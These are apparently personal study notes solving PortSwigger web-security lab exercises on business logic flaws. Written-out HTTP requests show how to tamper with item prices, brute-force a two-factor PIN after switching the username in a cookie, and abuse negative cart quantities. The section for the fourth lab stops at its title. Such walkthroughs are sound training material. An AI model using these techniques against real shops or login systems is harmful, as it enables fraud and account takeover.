# Business logic vulnerabilities
https://portswigger.net/web-security/logic-flaws

# https://portswigger.net/web-security/logic-flaws/examples
https://portswigger.net/web-security/logic-flaws/examples

# ***1. Lab: Excessive trust in client-side controls***
https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls

To solve the lab, buy a "Lightweight l33t leather jacket". 

add the item to cart and find the request in burp:
    POST /cart HTTP/1.1
    Host: 0a9c002a04b87e35c0d67b0d00ce0043.web-security-academy.net
    Cookie: session=LGMwHDwHNZB47FAVYui4ALNCh8OVxcTC
    Content-Length: 48


    productId=1&redir=PRODUCT&quantity=1&price=133700

change the price to 100 (which translates to 1$)

    productId=1&redir=PRODUCT&quantity=1&price=100

enter to the cart - now we have enpough funds - make the purchse

# 1337 own!

# ***2. Lab: 2FA broken logic***
https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic

To solve the lab, access Carlos's account page. 

**start login process and observe requests:**
1. initiate process:
    GET /login HTTP/1.1

2. send username and password:
    POST /login HTTP/1.1

    username=wiener&password=peter

3. initate mfa process:
    GET /login2 HTTP/1.1

4. send mfa pin code recieve by email:
    POST /login2 HTTP/1.1
    Cookie: session=hb0XBJWhxcjHxyHrQ353WaRe6k6LH9Le; verify=wiener


    mfa-code=1234

- note that username value can be changed 
- note there is no limit on how many failed attempts - so brute force is possible.

**Attack:**
send **POST /login2 HTTP/1.1** to intruder at change username to carlos and mark the pincode as variable. go to payload and choose numbers 0 to 9999 in steps of 1. 
initiate attack and look for **HTTP/1.1 302 Found**


# ***3.Lab: High-level logic vulnerability***
https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level

To solve the lab, buy a "Lightweight l33t leather jacket". 

login and add the 1337 jacket to cart. find request:
    POST /cart HTTP/1.1

    productId=1&quantity=1&redir=CART

remove it from cart - observe request:
    POST /cart HTTP/1.1

    productId=1&quantity=-1&redir=CART

we sse quantity field recieves negative numbers. send request with negative value again and observe cart total is -1337$. try to **place order** and observe error message: 

Cart total price cannot be less than zero 

add items in total value of 1338$ - 1436$ (so Cart value will be between 1$ to 100$ - our **store credit**)

place order again - observe success!



# ***4. Lab: Low-level logic flaw***
https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level

To solve the lab, buy a "Lightweight l33t leather jacket"

